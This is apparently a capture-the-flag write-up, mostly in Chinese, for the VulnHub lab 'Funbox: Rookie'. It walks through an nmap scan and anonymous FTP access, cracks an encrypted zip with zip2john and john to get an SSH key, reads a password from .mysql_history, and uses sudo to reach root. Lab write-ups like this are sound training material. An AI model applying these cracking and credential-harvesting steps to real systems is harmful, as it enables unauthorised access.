# Funbox: Rookie

2024-5-17 https://www.vulnhub.com/entry/funbox-2-rockie,520/

difficulty: easy

## IP

192.168.5.30

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f9467dfe0c4da97e2d77740fa2517251 (RSA)
|   256 15004667809b40123a0c6607db1d1847 (ECDSA)
|_  256 75ba6695bb0f16de7e7ea17b273bb058 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/logs/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

21 ftp 端口能匿名登陆，里面有一些文件：

```
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
```

看文件名的命名规则，好像是对应的用户名，然后整体打包的。下载后，发现每个 zip 包中都是加密的，只保存了一个 id_rsa 文件，但是我们目前没有密码。

其中有 2 个隐藏文件，内容如下：

```
cat .@admins
SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290


cat .@users
Hi Users,

be carefull with your keys. Find them in %yourname%.zip.
The passwords are the old ones.

Regards
root
```

第一个好像是一个 base64，看看解码信息：

```
Hi Admins,

be carefull with your keys. Find them in %yourname%.zip.
The passwords are the old ones.

Regards
root
```

提示 key 存在于 zip 中，但是这么多 zip，不知道哪一个是真实的用户，需要挨个尝试，最终找到 tom.zip 可以找到解压密码：

```
zip2john tom.zip > hash
john hash --wordlist=~/tools/dict/rockyou.txt

iubire           (tom.zip/id_rsa)
```

解压 tom.zip 得到 id_rsa:

```
chmod 600 id_rsa
ssh -i id_rsa tom@192.168.5.30
```

在当前目录下得到信息：

```
tom@funbox2:~$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

可以得到 tom 的密码：xx11yy22!

sudo -l 发现 tom 用户具有全部权限：

```
[sudo] password for tom:
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

所以直接 sudo su 就可以切换到 root 用户了：

```
root@funbox2:~# cat flag.txt
   ____  __  __   _  __   ___   ____    _  __             ___
  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |
 / _/  / /_/ /  /    /  / _  |/ /_/ / _>  <             / __/
/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/
           ____ ___  ___  / /_ ___  ___/ /       / /
 _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/
(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)

from @0815R2d2 with ♥
```

看看 80 web 服务上有什么有价值的信息，默认页面是 apache 页面，看来需要进行目录扫描了:

```
http://192.168.5.30/robots.txt

Disallow: /logs/
```

但是访问发现 404 /logs/，估计是个兔子洞。
